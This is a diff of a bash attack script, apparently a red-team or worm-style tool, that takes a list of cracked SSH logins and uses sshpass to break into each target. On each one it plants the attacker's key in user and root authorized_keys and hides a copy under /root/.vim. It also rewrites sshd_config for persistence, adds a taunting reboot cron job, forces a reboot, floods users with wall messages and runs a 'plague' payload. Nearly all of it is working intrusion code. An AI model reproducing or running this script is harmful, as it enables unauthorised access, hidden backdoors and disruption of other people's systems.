@@ -409,23 +409,23 @@ while read -r tango; do
 	password="$(echo $tango | cut -d" " -f3)"
 
 	echo "------------------------------------------------------------------"
-	echo "|target= $target       |"
-	echo "|username= $username   |"
-	echo "|password= $password   |"
+	echo "|target= $target"
+	echo "|username= $username"
+	echo "|password= $password"
 
-	#inserting ssh keys for root and the cracked user
+#inserting ssh keys for root and the cracked user
 	printf "\nInserting ssh key into [$target] using: $username\n"
-	#cat ~/.ssh/id_rsa.pub | sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys"
 	sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" <$HOME/.ssh/id_rsa.pub
-	#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
+#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
 	printf "\nPoisoning sshd rules on [$target]\n"
 	ssh -n -o StrictHostKeyChecking=no $target "mkdir /root/.vim
 											cp /root/.ssh/authorized_keys /root/.vim/ssh
 											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
 											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
-											at now +1 minute <<< 'init 6'"
-	ssh -n -o StrictHostKeyChecking=no $username@$target "(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -"
-	#jumping into each box and letting loose the plague
+											at now +1 minute <<< 'init 6'
+											for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done"
+	#ssh -n -o StrictHostKeyChecking=no $username@$target "(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -"
+#jumping into each box and letting loose the plague
 	printf "\nReleasing the plague inside of [$target]\n"
 	ssh -n -o StrictHostKeyChecking=no $target "$(declare -f payload); payload"
 done <<< $(sort -u $crackedLogins)
